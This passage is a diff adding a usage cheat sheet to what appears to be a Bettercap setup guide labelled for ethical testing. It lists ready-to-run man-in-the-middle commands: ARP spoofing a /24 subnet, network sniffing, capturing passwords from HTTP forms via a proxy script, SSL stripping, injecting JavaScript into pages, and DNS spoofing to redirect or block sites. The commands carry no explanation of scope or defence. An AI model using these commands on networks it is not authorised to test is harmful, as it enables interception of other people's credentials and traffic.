@@ -200,3 +200,63 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 ---
 
 ✅ You're now ready to use Bettercap for ethical testing!
+
+
+
+
+
+# sample of using
+
+##  Enable ARP Spoofing + DNS/HTTP/HTTPS Sniffing
+- optional -----> set arp.spoof.targets 192.168.1.0/24
+- set arp.spoof.internal true
+- arp.spoof on
+- net.sniff on
+
+
+
+## Capture Passwords from HTTP Forms
+
+- http.server on
+- http.proxy on
+- set http.proxy.script js/passwords.js
+
+
+
+##  Log All DNS, HTTP, and HTTPS (SNI)
+- set net.sniff.verbose true
+- set net.sniff.local true
+- net.sniff on
+## Strip HTTPS (Best effort)
+- set https.proxy.sslstrip true
+- https.proxy on
+## optional  (Inject JavaScript into HTTP Pages)
+- set http.proxy.script js/injectjs.js
+- http.proxy on
+
+## Redirect or Block a Website
+
+- set dns.spoof.domains facebook.com
+- set dns.spoof.address 142.250.190.14  # google.com IP
+
+# Block a site (no resolve)
+- set dns.spoof.domains facebook.com
+- set dns.spoof.address 0.0.0.0
+- dns.spoof on
+
+## Real-Time GUI
+
+- caplets.update
+- ui.update
+- ui.enable
+
+
+
+# Reset all
+
+- net.recon off
+- arp.spoof off
+- dns.spoof off
+- net.sniff off
+- https.proxy off
+- http.proxy off
